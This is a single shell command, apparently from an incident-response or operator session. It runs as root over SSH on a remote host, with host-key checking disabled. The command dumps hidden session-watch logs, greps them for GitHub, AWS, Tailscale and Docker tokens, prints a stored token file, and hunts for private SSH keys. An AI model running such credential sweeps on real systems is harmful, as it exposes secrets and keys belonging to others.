timeout 90 ssh -o StrictHostKeyChecking=no -i /root/.rxk radix-irprobe@85.234.79.62 'sudo bash -s' <<'PAYLOAD'
echo "=== bridge-hits.log ==="
cat /tmp/.sesswatch/bridge-hits.log
echo "=== hist-hits.log (45KB) ==="
cat /tmp/.sesswatch/hist-hits.log | head -200
echo "=== hits.log token grep ==="
grep -aoE "(tskey-[a-z]+-[A-Za-z0-9_-]+|ghp_[A-Za-z0-9]{36}|gho_[A-Za-z0-9]{36}|github_pat_[A-Za-z0-9_]{60,}|dckr_pat_[A-Za-z0-9_-]{27}|AKIA[A-Z0-9]{16}|rx_[A-Za-z0-9]{32,})" /tmp/.sesswatch/hits.log | sort -u | head -30
echo "=== pats.txt content ==="
cat /root/pats.txt
echo "=== outbound.log tail ==="
tail -30 /tmp/.sesswatch/outbound.log
echo "=== private keys anywhere ==="
find /home /root /data -maxdepth 4 -name "id_*" ! -name "*.pub" 2>/dev/null | head -20
echo "=== data/alexnails ==="
ls -la /data/alexnails/ 2>&1 | head -20
PAYLOAD
